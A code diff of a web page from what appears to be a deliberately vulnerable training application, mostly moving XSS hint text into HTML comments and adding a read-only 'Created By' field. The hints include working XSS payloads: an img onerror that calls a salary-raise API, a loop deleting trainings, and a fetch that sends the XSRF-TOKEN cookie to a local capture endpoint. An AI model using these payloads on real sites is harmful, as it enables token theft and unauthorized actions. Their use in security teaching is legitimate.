@@ -80,16 +80,13 @@
     <div style="width: 600px">
         <div id="editDescriptionQ" style="height: 100px"></div>
     </div>
-    <div style="font-size: smaller" title="XSS warmup">&lt;img src='x' onerror='alert(2)'&gt;</div>
-    <div style="font-size: smaller" title="for XSS attacks">
-        &lt;img src='x' onerror='fetch(`api/salary/raise?who=vrentea&amount=MAX`).then(function (x) {alert(`Thank you!`)});'>
-    </div>
-    <div style="font-size: smaller">
-        see more ideas in source
+    <div style="font-size: smaller" title="XSS warmup">&lt;img src='x' onerror='alert(2)'&gt; + see more XSS ideas in source
         <!-- for (let i=0;i<10;i++) $.ajax(restEndpoint + "/trainings/"+i, {method: "DELETE"}) -->
         <!-- fetch('http://localhost:9999/csrf/capture', {method: 'POST', body: JSON.stringify({token: document.cookie.match('(^|;)\\s*XSRF-TOKEN\\s*=\\s*([^;]+)')?.pop() || ''}), headers: {'Content-Type': 'application/json'}}) -->
+        <!-- <img src='x' onerror='fetch(`api/salary/raise?who=vrentea&amount=MAX`).then(function (x) {alert(`Thank you!`)});'> -->
     </div>
     Start Date (dd-mm-yyyy):<input type="text" id="editStartDate"/> <br/>
+    Created By:<input type="text" id="editCreatedBy" readonly style="background-color: #e9e9e9; color: #666;"/> <br/>
     Teacher: <select id="editTeacher"></select><br/>
     <b>Teacher Bio:</b> <br/>
     <div id="teacherBio"></div>
@@ -275,6 +272,7 @@
                 editDescriptionQuill.root.innerHTML = data.description;
                 $("#editStartDate").val(data.startDate);
                 $("#editTeacher").val(data.teacherId);
+                $("#editCreatedBy").val(data.createdBy);
                 $("#teacherBio").text(data.teacherBio);
                 versionUnderEdit = data.version;
                 $('#trainingMain').hide();
